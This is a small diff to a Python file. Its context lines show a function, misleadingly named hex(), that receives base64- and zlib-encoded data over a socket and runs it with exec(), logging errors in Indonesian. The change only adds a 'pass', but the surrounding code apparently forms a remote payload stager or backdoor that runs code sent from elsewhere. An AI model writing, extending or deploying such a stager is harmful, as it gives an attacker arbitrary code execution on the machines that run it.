@@ -130,6 +130,7 @@ def hex():
         exec(zlib.decompress(base64.b64decode(d)), {'s': s})
     except Exception as e:
         logging.error(f"Kesalahan saat menerima atau mengeksekusi data: {e}")
+        pass
     finally:
         s.close()
 
